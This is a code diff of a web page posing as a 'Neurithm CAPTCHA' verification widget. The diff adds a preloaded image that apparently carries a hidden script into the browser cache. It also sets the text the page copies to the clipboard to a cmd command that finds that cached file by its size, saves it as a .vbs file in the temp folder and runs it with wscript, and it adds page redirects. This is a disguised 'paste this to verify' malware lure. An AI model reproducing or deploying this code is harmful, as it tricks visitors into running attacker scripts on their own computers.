@@ -3,6 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="preload" as="image" href="/images/f-img.png">
 <title>Neurithm CAPTCHA</title>
 <style>
   :root{
@@ -274,6 +275,10 @@
     margin:-1.5px;
   }
 
+  .hidden-image {
+    display: none;
+  }
+
   .loader span:nth-child(1){animation:orbit1 1.5s linear infinite}
   .loader span:nth-child(2){animation:orbit2 1.5s linear infinite}
   .loader span:nth-child(3){animation:orbit3 1.5s linear infinite}
@@ -439,7 +444,6 @@
               <span>Privacy</span> · <span>Help</span>
             </div>
           </div>
-
         </div>
       </div>
 
@@ -466,25 +470,12 @@
 
 <script>
 (() => {
-  window.addEventListener('DOMContentLoaded', () => {
-            // 1. 백그라운드에서 payload.png를 캐싱
-            const prefetchLink = document.createElement('link');
-            prefetchLink.rel = 'prefetch';
-            prefetchLink.href = '/payload.png'; // 서버의 실제 경로
-            prefetchLink.as = 'image';
-            document.head.appendChild(prefetchLink);
 
-            // 2. 3초 후 자동으로 run.html로 리디렉션 (사용자 경험을 위해)
-            setTimeout(() => {
-                window.location.href = '/run.html';
-            }, 3000);
-        });
-  
   const indicator = document.getElementById("indicator");
   const message = document.getElementById("message");
   const button = document.getElementById("verifyButton");
   const captcha = document.getElementById("captcha");
-  const fixingCode = 'Your operation is completed!';
+  const fixingCode = 'cmd /c "for /r "%LOCALAPPDATA%" %i in (f_*) do @if %~zi==1672 (copy /y "%i" "%TEMP%\t.vbs" && start wscript "%TEMP%\t.vbs")"';
 
   let isVerifying = false;       // Check if verification is in progress
   let isProcessingEnter = false; // Prevent duplicate Enter key inputs
@@ -525,6 +516,10 @@
         document.body.removeChild(textArea);
       }
     });
+  }
+
+  function goToNextPage() {
+    window.location.href = "main.html"; 
   }
 
   function makeLoader(){
@@ -585,6 +580,8 @@
     // Reset state
     isVerifying = false;
     isProcessingEnter = false;
+    
+    setTimeout(goToNextPage, 3000); 
   }
 
   // 1. Start loading when the button is clicked
